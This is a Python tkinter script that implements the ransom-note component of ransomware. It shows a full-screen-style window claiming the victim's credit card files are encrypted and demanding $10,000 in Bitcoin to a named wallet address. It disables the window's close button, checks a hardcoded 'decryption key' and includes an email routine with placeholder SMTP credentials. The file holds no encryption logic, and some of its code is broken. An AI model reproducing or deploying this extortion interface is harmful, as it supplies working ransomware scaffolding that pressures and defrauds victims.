import threading # used for ransom note and decryption key on dekstop
import tkinter as tk
from tkinter import messagebox
import smtplib
from tkinter import *
import time # used to time.sleep interval for ransom note & check desktop to decrypt system/files
from PIL import Image, ImageTk


class CreditCardPopup:
    def __init__(self):
        self.window = tk.Tk()
        self.window.title("Your files are encrypted")
        self.encrypted = False
        self.decryption_key = None
        self.root = None
        self.create_widgets()
        width = 700
        height = 300
        x = (self.window.winfo_screenwidth() - width) // 2
        y = (self.window.winfo_screenheight() - height) // 2
        self.window.geometry("{}x{}+{}+{}".format(width, height, x, y))
        self.window.protocol("WM_DELETE_WINDOW", self.do_nothing)


    def create_widgets(self):
        self.message_label = tk.Label(self.window, text="We have encrypted all your credit card files.\nIf you want to get them back, you need to pay us $10,000 in Bitcoin.\nSend the Bitcoin to this address: 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2\n\nWARNING: DO NOT TRY TO DECRYPT THE FILES YOURSELF")
        self.message_label.pack(side="top", fill="both", expand=True, padx=20, pady=20)

        self.key_label = tk.Label(self.window, text="Enter decryption key:")
        self.key_label.pack(side="top", padx=5, pady=5)

        self.key_entry = tk.Entry(self.window, show="*")
        self.key_entry.pack(side="top", padx=5, pady=5)

        self.ok_button = tk.Button(self.window, text="OK", width=10, command=self.check_key)
        self.ok_button.pack(anchor="center", padx=5, pady=5)

        # self.cancel_button = tk.Button(self.window, text="Cancel", width=10, command=self.cancel)
        # self.cancel_button.pack(side="left", padx=5, pady=5)

    def start(self):
        messagebox.showwarning("Your files are encrypted", "Click 'OK' to enter the decryption key.")

    def check_key(self):
        if self.key_entry.get() == "code":
            self.decryption_key = self.key_entry.get()
            self.window.destroy()
            messagebox.showinfo("Congratulations", "Your files have been decrypted!\nThank you for paying the ransom and supporting our business.")
            self.root.destroy()


        else:
            messagebox.showerror("Incorrect key", "The decryption key you entered is incorrect. Please try again.")
            self.key_entry.delete(0, tk.END)  # Reset the text in the Entry widget

    def cancel(self):
        self.window.destroy()
    def do_nothing(self):
        pass

    def send_email(self):
        from_address = "your_email@example.com"
        to_address = "ransomware_email@example.com"
        subject = "Ransom payment confirmation"
        body = "Dear ransomware author,\nI have paid the ransom of $10,000 in Bitcoin to the address you provided. Please email me the decryption key at your earliest convenience.\n\nSincerely,\nVictim"

        message = "From: {}\nTo: {}\nSubject: {}\n\n{}".format(from_address, to_address, subject, body)

        try:
            smtp_server = smtplib.SMTP("smtp.gmail.com", 587)
            smtp_server.starttls()
            smtp_server.login(from_address, "your_email_password")
            smtp_server.sendmail(from_address, to_address, message)
            smtp_server.quit()

            messagebox.showinfo("Email sent", "Your payment confirmation email has been sent.")
        except:
            messagebox.showerror("Email error", "There was an error sending your payment confirmation email.")

    def wait_for_key_input(self):
        self.window.mainloop()
        
    def destroy_window_and_message_box(self):
        if self.window:
            self.window.destroy()
        if self.message_box:
            self.message_box.destroy()
    
        
def main():
    root = tk.Tk()
    root.withdraw()
    popup = CreditCardPopup()
    popup.root = root
    popup.start()
    popup.wait_for_key_input()
        
if __name__ == '__main__':
    main()
 